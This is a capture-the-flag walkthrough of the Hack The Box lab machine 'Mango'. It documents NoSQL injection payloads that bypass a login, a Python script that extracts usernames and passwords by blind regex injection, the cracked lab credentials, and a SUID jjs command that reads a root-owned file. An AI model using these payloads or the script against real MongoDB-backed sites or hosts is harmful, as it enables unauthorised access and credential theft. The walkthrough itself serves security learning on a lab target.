# Mango

## Preparation

Added IP to /etc/hosts as "mango.htb"

## Recon

Starting with nmap
```
nmap -sV -sC mango.htb
```

### HTTPS (443/TCP)

Domain name in cert - staging-order.mango.htb
Image refernce in source code - https://github.com/MangoDevelopers/mango-new-logo/raw/master/NewMango.jpg
	MangoDB?
Search Engine Screen
	No reflective input
	Googling "MongoDB SQL Injection" brings up a lot of results as NoSQL, testing those

It's using virtual host routing, put staging-order.mango.htb in /etc/hosts and visiting it returns a login screen

Auth bypass from PayloadAllTheThings worked: username[$ne]=toto&password[$ne]=toto

email found: admin@mango.htb

I can enumerate users by using username=toto&password[$ne]=toto and replacing the username value, if it returns 302 then the username is valid

## Cracking the Perimeter

Used cewl to build a wordlist of users, added the following
```
admin
Mango
mango
Sweet
sweet
Juicy
juicy
Admin
admin
admin.htb
```
```
import json, requests, urllib3, string, urllib

host = str("http://staging-order.mango.htb/index.php")
header = {'content-type': 'application/x-www-form-urlencoded'}
userlist = []
passlenlist = []
passlist = []
chars = string.ascii_letters + string.digits + string.punctuation
users = open('users.txt','r')

for user in users:
	user = user.rstrip()
	payload = str("username=%s&password[$ne]=admin&login=login" % user)
	r = requests.post(host, data = payload, headers = header, verify = False, allow_redirects = False)
	if r.status_code == 302:
		print(str("Found user: %s" % user))
		userlist.append(user)

for user in userlist:
	for i in range(1,64):
		payload = str("username=%s&password[$regex]=^.{%s}&login=login" % (user,str(i)))
		r = requests.post(host, data = payload, headers = header, verify = False, allow_redirects = False)
		if r.status_code == 200:
			print(str("%s's password is %s characters" % (user,i-1)))
			passlenlist.append(i-1)
			break

for user in userlist:
	password = str("")
	passwordlen = passlenlist[int(userlist.index(str(user)))]
	while int(len(password)) <= int(passwordlen):
		for c in chars:
			if c not in ['*','+','.','?','|','&']:
				payload = str("username=%s&password[$regex]=^%s&login=login" % (str(user),str(password + c)))
				r = requests.post(host, data = payload, headers = header, verify = False, allow_redirects = False)
				print(str("I tried %s for %s" % (password + c, user)))
				if r.status_code == 302:
					password += c
				if int(len(password)) == int(passwordlen):
					passlist.append(password)
					continue

passlist = list(dict.fromkeys(passlist))
for i in range(0,len(userlist)):
	print(str("%s's password is %s" % (userlist[i],passlist[i])))
```

admin and mango are users (case sensitive)
mango's password is `h3mXK8RhU~f{]f5H`
admin's password is `t9KcS3>!0B#2`

`ssh:mango:h3mXK8RhU~f{]f5H`
`local:admin:t9KcS3>!0B#2`

## Privilege Escalation

SUID on jjs, root owns, admin can run

`echo 'var BufferedReader = Java.type("java.io.BufferedReader");var FileReader = Java.type("java.io.FileReader");var br = new BufferedReader(new FileReader("/root/root.txt"));while ((line = br.readLine()) != null) { print(line); }' | jjs`
